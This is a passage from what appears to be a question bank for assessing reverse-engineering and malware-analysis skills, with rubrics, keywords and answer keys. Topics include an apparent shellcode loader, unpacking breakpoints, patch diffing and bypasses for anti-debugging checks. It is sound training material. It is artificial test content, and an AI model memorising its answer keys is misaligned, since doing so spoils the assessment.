      { id: "inline-hooking", description: "Explains inline hooking: overwrites function prologue with a JMP to monitoring code; can be detected by integrity checks; tool example: Frida, Detours, or API Monitor", points: 2, keywords: ["inline", "prologue", "JMP", "detour", "Frida", "Detours", "trampoline"], check: "Student explains inline hooking and names a tool" },
      { id: "dll-proxying", description: "Explains DLL proxying: replaces a DLL with a wrapper that exports the same functions, logs arguments, and forwards to the real DLL; tool example: custom proxy or DLL Export Viewer + manual creation", points: 2, keywords: ["proxy", "wrapper", "forward", "exports", "log arguments", "replace DLL", "same functions"], check: "Student explains DLL proxying mechanism" },
      { id: "etw-monitoring", description: "Explains ETW: consumes events from OS providers (Microsoft-Windows-Kernel-Process, etc.); no code modification needed; but can be patched by the sample; tool example: Process Monitor, SilkETW", points: 2, keywords: ["ETW", "provider", "consumer", "no modification", "Process Monitor", "SilkETW", "patched"], check: "Student explains ETW monitoring and its tamperability" },
      { id: "syscall-recommendation", description: "For direct syscall samples, recommends kernel-mode logging or hypervisor-based monitoring since user-mode hooks are all bypassed; explains that syscall-level logging captures everything regardless of user-mode evasion", points: 2, keywords: ["kernel-mode", "hypervisor", "syscall", "direct syscall", "bypass user-mode", "kernel logging", "recommended"], check: "Student recommends kernel-level monitoring for direct-syscall samples with reasoning" },
    ],
    gaps: [
      { if_missing: "iat-hooking", gap: "IAT hooking for API monitoring" },
      { if_missing: "inline-hooking", gap: "Inline hooking mechanism and tooling" },
      { if_missing: "etw-monitoring", gap: "ETW-based malware monitoring capabilities and limitations" },
      { if_missing: "syscall-recommendation", gap: "Monitoring strategy for samples using direct syscalls" },
    ],
  },
},

{
  competencyId: "reverse-engineering",
  subTopic: "ghidra-decompilation",
  questionType: "fix_code",
  difficulty: 3,
  questionText: `Ghidra's decompiler produced this output for a malware function. The analyst suspects the decompiler misidentified types and missed a key behavior. Fix the decompilation:

\`\`\`c
void FUN_10001000(undefined4 param_1, undefined4 param_2) {
    undefined4 local_14;
    undefined4 local_10;
    int local_c;
    undefined4 local_8;

    local_8 = 0;
    local_14 = param_1;
    local_10 = param_2;
    local_c = (*DAT_10005000)(0xffffffff, 0, 0, &local_14, &local_8);
    if (local_c == 0) {
        (*DAT_10005004)(local_8, local_14, local_10);
        (*DAT_10005008)(local_8);
    }
    return;
}
\`\`\`

Context from the analyst's notes:
- DAT_10005000 through DAT_10005008 are function pointers resolved at runtime
- 0xFFFFFFFF as a process handle means GetCurrentProcess()
- The function takes a base address and a size as parameters

1. Retype the function with proper Windows API types.
2. What three APIs are likely at DAT_10005000, 10005004, and 10005008?
3. What is this function doing?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "api-identification", description: "Identifies the three APIs: DAT_10005000 = NtAllocateVirtualMemory (or VirtualAlloc), DAT_10005004 = memcpy/RtlCopyMemory (copies payload), DAT_10005008 = NtFreeVirtualMemory or calls the allocated buffer", points: 3, keywords: ["NtAllocateVirtualMemory", "VirtualAlloc", "memcpy", "RtlCopyMemory", "NtFreeVirtualMemory", "call", "function pointer"], check: "Student correctly identifies at least 2 of the 3 API function pointers" },
      { id: "retyped", description: "Properly retypes: param_1 as PVOID (base address), param_2 as SIZE_T (region size), local_8 as PVOID (allocated base), local_c as NTSTATUS, and applies correct pointer types", points: 2, keywords: ["PVOID", "SIZE_T", "NTSTATUS", "HANDLE", "pointer", "retype", "proper types"], check: "Student applies correct Windows API types to parameters and locals" },
      { id: "behavior", description: "Identifies the function as allocating memory in the current process, copying data into it, and either executing it or freeing it — likely a shellcode loader or memory relocation function", points: 3, keywords: ["allocate", "copy", "execute", "current process", "shellcode", "loader", "self-injection", "relocate"], check: "Student correctly identifies the allocate-copy-execute or allocate-copy-free behavior" },
    ],
    gaps: [
      { if_missing: "api-identification", gap: "Identifying dynamically resolved APIs from call patterns and arguments" },
      { if_missing: "retyped", gap: "Applying Windows API types to decompiler output" },
      { if_missing: "behavior", gap: "Behavioral analysis of decompiled malware functions" },
    ],
  },
},

{
  competencyId: "reverse-engineering",
  subTopic: "breakpoint-strategies",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `You are debugging a packed executable in x64dbg. The packer decrypts its payload in stages:
- Stage 1: Decrypts a loader stub
- Stage 2: The loader allocates memory, copies the real PE, and fixes imports
- Stage 3: The loader jumps to the OEP

Describe your breakpoint strategy to reach the OEP efficiently. For each breakpoint you set, explain:
1. What API or address you break on and why
2. What information you extract at that breakpoint
3. How you decide where to set the next breakpoint

Also explain: why can't you just set a breakpoint on the OEP directly?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "api-breakpoints", description: "Sets breakpoints on VirtualAlloc/VirtualProtect to catch memory allocation for the unpacked payload, and on GetProcAddress/LoadLibrary to observe import resolution", points: 2, keywords: ["VirtualAlloc", "VirtualProtect", "GetProcAddress", "LoadLibrary", "API breakpoint", "allocation"], check: "Student sets breakpoints on key unpacking APIs" },
      { id: "oep-detection", description: "Describes watching for the final VirtualProtect that makes the unpacked code executable, or watching for a far jump out of the packer's code region to identify the OEP transfer", points: 2, keywords: ["far jump", "distant jump", "VirtualProtect", "execute", "leave packer", "OEP transfer", "final"], check: "Student describes a method to detect the OEP transfer moment" },
      { id: "cannot-direct-bp", description: "Explains why you can't set a breakpoint on the OEP directly: the OEP code doesn't exist yet (it's encrypted/compressed), so you can't know the address or set a memory breakpoint there until it's unpacked", points: 2, keywords: ["doesn't exist", "encrypted", "compressed", "not unpacked", "unknown address", "can't set"], check: "Student explains why the OEP is not directly breakpointable" },
      { id: "progressive-strategy", description: "Describes a progressive strategy: break on allocations to find the target region, then use hardware breakpoints or memory breakpoints on that region to catch the write and subsequent execution", points: 2, keywords: ["progressive", "hardware breakpoint", "memory breakpoint", "write access", "execute access", "watch", "region"], check: "Student describes a systematic multi-stage breakpoint strategy" },
    ],
    gaps: [
      { if_missing: "api-breakpoints", gap: "API-level breakpoint strategies for unpacking" },
      { if_missing: "oep-detection", gap: "OEP detection techniques during dynamic unpacking" },
      { if_missing: "cannot-direct-bp", gap: "Understanding why packed code prevents direct OEP breakpoints" },
      { if_missing: "progressive-strategy", gap: "Progressive breakpoint strategies for multi-stage unpackers" },
    ],
  },
},

{
  competencyId: "reverse-engineering",
  subTopic: "binary-diffing",
  questionType: "compare_contrast",
  difficulty: 4,
  questionText: `Compare binary diffing tools and methodologies. Address:

1. What is binary diffing and when would a security researcher use it?
2. Compare BinDiff (from Zynamics/Google) with Diaphora (open source). What algorithm does each use for function matching?
3. How would you use binary diffing to analyze a Microsoft security patch? Walk through the workflow.
4. What are the limitations of binary diffing for analyzing obfuscated or heavily optimized code?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "purpose", description: "Explains binary diffing compares two versions of a binary to find changed functions; used for patch analysis (1-day exploit development), malware variant comparison, and understanding code evolution", points: 2, keywords: ["compare", "two versions", "patch analysis", "1-day", "variant", "changed functions", "diff"], check: "Student explains the purpose and use cases of binary diffing" },
      { id: "tool-comparison", description: "Compares tools: BinDiff uses control-flow graph matching and instruction mnemonics; Diaphora uses heuristic-based matching including pseudocode diffing; discusses strengths of each", points: 2, keywords: ["BinDiff", "Diaphora", "control flow graph", "CFG", "pseudocode", "heuristic", "matching algorithm"], check: "Student compares the matching approaches of at least 2 diffing tools" },
      { id: "patch-workflow", description: "Describes patch analysis workflow: get pre-patch and post-patch binaries, load both in IDA/Ghidra, run BinDiff/Diaphora, examine changed functions, focus on security-relevant changes (bounds checks, null checks, new validations)", points: 2, keywords: ["pre-patch", "post-patch", "changed functions", "bounds check", "validation", "security-relevant", "IDA", "Ghidra"], check: "Student walks through a patch analysis workflow" },
      { id: "limitations", description: "Discusses limitations: obfuscation defeats graph matching, compiler optimizations (inlining, reordering) create false positives/negatives, full recompilation makes diffing noisy", points: 2, keywords: ["obfuscation", "optimization", "inlining", "reordering", "false positive", "noisy", "recompilation", "limitation"], check: "Student identifies at least 2 limitations of binary diffing" },
    ],
    gaps: [
      { if_missing: "purpose", gap: "Binary diffing purpose and use cases in security research" },
      { if_missing: "tool-comparison", gap: "Binary diffing tools and their matching algorithms" },
      { if_missing: "patch-workflow", gap: "Patch diffing workflow for vulnerability analysis" },
      { if_missing: "limitations", gap: "Limitations of binary diffing for obfuscated/optimized code" },
    ],
  },
},

{
  competencyId: "reverse-engineering",
  subTopic: "function-identification",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText: `You're analyzing a stripped binary (no symbols) in Ghidra. The decompiler shows this function:

\`\`\`c
int FUN_004012a0(char *param_1, char *param_2) {
    int iVar1;
    char *pcVar2;
    char *pcVar3;

    pcVar2 = param_1;
    pcVar3 = param_2;
    do {
        iVar1 = (int)*pcVar2 - (int)*pcVar3;
        if (iVar1 != 0) break;
        if (*pcVar2 == '\\0') break;
        pcVar2 = pcVar2 + 1;
        pcVar3 = pcVar3 + 1;
    } while (true);
    return iVar1;
}
\`\`\`

1. What standard library function is this?
2. How did you identify it?
3. What Ghidra feature could have identified this automatically, and why might it have failed?`,
  rubric: {
    maxScore: 6,
    criteria: [
      { id: "function-id", description: "Correctly identifies this as strcmp: compares two strings character by character, returns the difference of the first non-matching pair or 0 if equal", points: 2, keywords: ["strcmp", "string compare", "character by character", "difference", "equal", "standard library"], check: "Student correctly identifies the function as strcmp" },
      { id: "identification-method", description: "Explains identification approach: recognizes the pattern of comparing byte-by-byte until a difference or null terminator, with the subtraction return value being the strcmp convention", points: 2, keywords: ["byte-by-byte", "null terminator", "subtraction", "return value", "pattern", "convention"], check: "Student explains how they recognized the strcmp pattern" },
      { id: "ghidra-feature", description: "Mentions Ghidra's Function ID (FID) or FLIRT-equivalent signature matching; explains it may fail on statically linked or recompiled CRT functions with different optimization settings", points: 2, keywords: ["Function ID", "FID", "FLIRT", "signature matching", "statically linked", "optimization", "CRT", "recompiled"], check: "Student names Ghidra's function identification feature and explains why it might fail" },
    ],
    gaps: [
      { if_missing: "function-id", gap: "Recognizing standard library functions from decompiled code" },
      { if_missing: "identification-method", gap: "Pattern-based function identification in stripped binaries" },
      { if_missing: "ghidra-feature", gap: "Automated function identification tools (Ghidra FID, IDA FLIRT)" },
    ],
  },
},

{
  competencyId: "reverse-engineering",
  subTopic: "debugger-detection",
  questionType: "design_solution",
  difficulty: 5,
  questionText: `You need to analyze a sophisticated malware sample that employs the following anti-analysis techniques:

1. Checks NtGlobalFlag in PEB for debugger traces (heap flags)
2. Scans for hardware breakpoints via GetThreadContext
3. Uses NtQuerySystemInformation to detect analysis tools by process name
4. Implements a watchdog thread that terminates the process if the main thread is suspended too long
5. Uses code checksumming to detect software breakpoints (INT3 / 0xCC patches)

Design a comprehensive bypass strategy that handles ALL five techniques simultaneously. For each, explain the mechanism of detection and your specific bypass. Your solution should be automatable (not requiring manual patching each time).`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "ntglobalflag", description: "Explains NtGlobalFlag at PEB offset 0x68/0xBC contains heap debug flags (FLG_HEAP_ENABLE_TAIL_CHECK etc.) when a debugger is attached; bypass by clearing the flags or using a plugin like ScyllaHide", points: 2, keywords: ["NtGlobalFlag", "PEB", "0x68", "0xBC", "heap flags", "FLG_HEAP", "ScyllaHide", "clear"], check: "Student explains NtGlobalFlag detection and provides a bypass" },
      { id: "hwbp-bypass", description: "Explains malware calls GetThreadContext and checks DR0-DR3 for non-zero values (hardware breakpoints); bypass by hooking GetThreadContext to zero out debug registers, or avoid using hardware breakpoints", points: 2, keywords: ["GetThreadContext", "DR0", "DR1", "DR2", "DR3", "debug registers", "hardware breakpoint", "hook", "zero"], check: "Student explains hardware breakpoint detection via debug registers and a bypass" },
      { id: "process-scan", description: "Explains NtQuerySystemInformation enumerates processes looking for analysis tool names; bypass by hooking to filter out tool process names or renaming analysis tools", points: 2, keywords: ["NtQuerySystemInformation", "process list", "enumerate", "tool names", "filter", "rename", "hook"], check: "Student explains process enumeration detection and a bypass" },
      { id: "watchdog-thread", description: "Explains the watchdog thread monitors main thread responsiveness; bypass by suspending the watchdog thread too, hooking the timing source, or patching the watchdog's check loop", points: 2, keywords: ["watchdog", "suspend", "timing", "patch", "monitor", "responsiveness", "both threads"], check: "Student explains watchdog thread detection and a bypass" },
      { id: "checksum-bypass", description: "Explains code checksumming detects INT3 (0xCC) software breakpoints by hashing its own code sections; bypass by using hardware breakpoints instead of software breakpoints, or by adjusting the checksum after patching", points: 2, keywords: ["checksum", "INT3", "0xCC", "software breakpoint", "hash", "code section", "hardware breakpoint", "adjust"], check: "Student explains code checksumming and provides a bypass strategy" },
    ],
    gaps: [
      { if_missing: "ntglobalflag", gap: "NtGlobalFlag-based debugger detection and bypass" },
      { if_missing: "hwbp-bypass", gap: "Hardware breakpoint detection via debug registers" },
      { if_missing: "process-scan", gap: "Process enumeration for analysis tool detection" },
      { if_missing: "watchdog-thread", gap: "Watchdog thread anti-debugging and bypass" },
      { if_missing: "checksum-bypass", gap: "Code integrity checking as anti-tamper mechanism" },
    ],
  },
},

{
  competencyId: "reverse-engineering",
  subTopic: "import-reconstruction",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `After unpacking a malware sample and dumping it from memory, the IAT (Import Address Table) contains runtime addresses instead of the original RVAs. You need to reconstruct the imports to create a working standalone PE.

1. Why does the dumped PE have runtime addresses in the IAT?
2. Walk through how a tool like Scylla or ImportREC reconstructs the import table.
3. What happens if some imports cannot be resolved (e.g., from a DLL that was manually mapped and is no longer loaded)?
4. After fixing imports, what other fixups might the dumped PE need before it runs correctly on its own?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "iat-addresses", description: "Explains that after the loader resolves imports, IAT entries contain absolute virtual addresses of the target functions; when the PE is dumped, these addresses are specific to the running process and meaningless in another context", points: 2, keywords: ["absolute address", "virtual address", "resolved", "loader", "specific to process", "meaningless", "runtime"], check: "Student explains why IAT contains runtime addresses after loading" },
      { id: "reconstruction-process", description: "Describes IAT reconstruction: scans the IAT for valid function pointers, looks up each address against loaded modules' export tables to identify the function and DLL, rebuilds a new import directory with correct entries", points: 2, keywords: ["scan", "function pointer", "export table", "lookup", "module", "rebuild", "import directory"], check: "Student walks through the import reconstruction process" },
      { id: "unresolvable", description: "Handles unresolvable imports: some functions may come from manually mapped DLLs not in the module list; analyst must identify them manually via analysis or use placeholder stubs", points: 2, keywords: ["unresolvable", "manually mapped", "not in module list", "manual", "placeholder", "stub", "identify"], check: "Student addresses what happens with unresolvable imports" },
      { id: "other-fixups", description: "Mentions additional fixups: section permissions may need correction, relocations may need rebasing, SizeOfImage may be wrong, and headers may need patching (checksum, etc.)", points: 2, keywords: ["section permissions", "relocations", "SizeOfImage", "headers", "checksum", "rebase", "PE header"], check: "Student identifies at least 2 additional fixups beyond import reconstruction" },
    ],
    gaps: [
      { if_missing: "iat-addresses", gap: "Understanding IAT state in dumped processes" },
      { if_missing: "reconstruction-process", gap: "Import reconstruction methodology (Scylla/ImportREC)" },
      { if_missing: "other-fixups", gap: "PE header and section fixups for dumped binaries" },
    ],
  },
},

{
  competencyId: "reverse-engineering",
  subTopic: "ida-patterns",
  questionType: "predict_output",
  difficulty: 2,
  questionText: `You see this pattern repeated multiple times in a malware sample's disassembly:

\`\`\`asm
mov   edi, 0x6A4ABC41        ; some constant
push  edi
call  sub_401500              ; appears to return a function pointer in eax
call  eax                     ; call the resolved function
\`\`\`

And sub_401500 looks like:
\`\`\`asm
sub_401500:
    push  ebp
    mov   ebp, esp
    mov   eax, [ebp+8]        ; the constant from edi
    ; ... walks PEB, finds kernel32, iterates exports,
    ; ... hashes each export name and compares with eax
    ; ... returns matching export address in eax
    pop   ebp
    ret   4
\`\`\`

1. What is the constant 0x6A4ABC41?
2. What technique is being used and why?
3. How would you determine which function 0x6A4ABC41 resolves to?`,
  rubric: {
    maxScore: 6,
    criteria: [
      { id: "api-hash", description: "Identifies 0x6A4ABC41 as an API hash — a precomputed hash of a function name used for dynamic resolution without string references", points: 2, keywords: ["API hash", "hash", "precomputed", "function name", "dynamic resolution", "no strings"], check: "Student identifies the constant as an API hash" },
      { id: "technique-name", description: "Names the technique as API hashing for import obfuscation; used to avoid leaving plaintext API names in the binary", points: 2, keywords: ["API hashing", "import obfuscation", "avoid strings", "plaintext", "hide imports", "obfuscation"], check: "Student names the API hashing technique and its purpose" },
      { id: "resolution-method", description: "Describes how to resolve the hash: use a hash database (hashdb IDA plugin, shellcode_hashes), reverse the hash algorithm from sub_401500 and brute-force it against known API names, or use online lookup tools", points: 2, keywords: ["hashdb", "database", "lookup", "brute force", "reverse algorithm", "shellcode_hashes", "known API names"], check: "Student describes at least one method to resolve an API hash to a function name" },
    ],
    gaps: [
      { if_missing: "api-hash", gap: "Recognizing API hash patterns in disassembly" },
      { if_missing: "technique-name", gap: "API hashing as an import obfuscation technique" },
      { if_missing: "resolution-method", gap: "Methods for resolving API hashes (hashdb, brute-force)" },
    ],
  },
},

];
